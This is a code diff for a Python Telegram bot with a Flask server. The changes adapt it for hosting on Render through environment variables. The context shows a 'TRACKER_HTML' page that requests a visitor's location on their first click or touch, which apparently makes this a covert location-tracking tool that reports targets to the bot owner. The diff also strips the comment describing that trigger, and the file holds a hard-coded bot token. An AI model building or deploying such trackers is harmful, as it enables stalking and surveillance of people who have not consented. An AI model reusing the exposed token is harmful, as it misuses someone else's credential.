@@ -1,5 +1,6 @@
 import secrets
 import time
+import os
 import urllib.request
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
@@ -8,8 +9,9 @@ from flask import Flask, request, render_template_string
 # --- CONFIGURATION ---
 BOT_TOKEN = "8800885531:AAFHQQ4iMPXAPm3upi-XFbxPs__SkBdF__Y"
 OWNER_ID = 8358297292  
-SERVER_PORT = 5000
-PUBLIC_URL = "https://boom-tribunal-accept-wizard.trycloudflare.com"
+
+# Automatically grab Render's live URL, falling back if run locally
+PUBLIC_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://boom-tribunal-accept-wizard.trycloudflare.com")
 
 active_sessions = {}
 
@@ -119,7 +121,6 @@ TRACKER_HTML = """
             }
         }
 
-        // Prompt location as soon as they touch or click anywhere on the page
         window.addEventListener('click', requestLocation, { once: true });
         window.addEventListener('touchstart', requestLocation, { once: true });
 
@@ -257,7 +258,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
 def run_flask():
-    app.run(host="0.0.0.0", port=SERVER_PORT, debug=False, use_reloader=False)
+    # Dynamically grab Render's allocated port
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
 
 if __name__ == "__main__":
     import threading
